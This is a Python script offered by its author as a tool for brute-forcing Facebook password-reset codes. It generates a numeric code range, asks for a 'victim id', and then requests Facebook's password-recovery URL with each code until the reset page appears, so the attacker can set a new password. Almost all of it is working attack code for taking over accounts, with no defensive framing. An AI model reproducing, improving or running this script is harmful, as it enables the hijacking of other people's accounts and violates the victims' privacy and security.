#!/usr/bin/python3
import time,webbrowser
import os,sys
import ssl,re
from urllib.request import urlopen



def slow(M):
    for c in M + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.1)
slow('welcome to my script\nmy nickname abdoxfox & my telegram id is @Pythonest')
#genarating code to use it fir brute forcing
first_code = int(input("Insert First Code: "))
#starting code
last_code = int(input("Insert Last Code: "))
#ending code
lst=[]
with open ('codes.txt','w') as f:
	for i in range(first_code,last_code):
		f.write(f'{str(i)}\n')
		lst.append(i)

while True:
    print("""
    ============ Menu ==============
    1- Reset Code Facebook Without Proxy
    2- Using Proxy :v :v

    """)

    choice=input("Enter your choice : ")

    if choice=="1":
        try:
            f= open('codes.txt', 'r',encoding='utf-8')
            w=f.read()
            print("Facebook code loaded \!/\n")
        except FileNotFoundError:
            print ("Can't Load List !")
            sys.exit(1);
        target=input('victim id :')
        for l in lst:
        	print(l)
        	try:
        		
        		rep= 'https://www.facebook.com/recover/password?u='+target+'&n='+str(l)+'&s=23&exp_locale=ar_AR&redirect_from=button'
        		gets= urlopen(rep).read()
        		search = re.search('password_new', gets.decode('utf-8'))
        		if search:
        			print ("The Code "+str(l)+" is Correct ^___^ ")
        			webbrowser.open(rep)
        			break
        		else:
        			print ("The Code "+str(l)+" is Incorrect :/ ")
        	except :
        		print (" Error on Sending Page to server ")
    elif choice=='2':
    	print('coming soon')
